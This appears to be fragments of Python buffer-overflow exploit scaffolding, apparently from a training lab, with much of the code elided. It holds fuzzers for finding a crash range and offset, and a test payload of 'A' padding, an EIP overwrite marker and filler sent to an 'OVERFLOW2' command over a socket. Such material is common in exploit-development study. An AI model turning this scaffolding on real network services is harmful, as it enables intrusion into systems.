...
def conn():
    ...
    try:
        # unique string pattern to find exact offset :
        ...
        # testing exact offset and stack place: 
        payload = "A" * 626 + "B" * 4 + "C" * 2000 # stack to 1005 bytes
        badchars = """"""
        ...
        s.recv(1024)
        print ("sending payload with %s bytes" %len(payload))
        # s.send("OVERFLOW1" + string + "\r\n")
        payload = ("OVERFLOW2 " + payload + "\r\n")
        ...
        print("Error: %s " %e)
        print("actual buffer at %s bytes" %len(payload))
        s.close()
        sys.exit()
...
"""
"""
# fuzzer to find manually exact offset
import sys
import socket
import time
...
def conn():
    ...
    try:
        ...
        print("Error: %s " %e)
        print("actual buffer at %s bytes" %len(string))
        s.close()
        sys.exit()
    except KeyboardInterrupt:
        sys.exit("^C")
...
"""
# fuzzer to find buffer range where programm crashes
import sys
import socket
import time
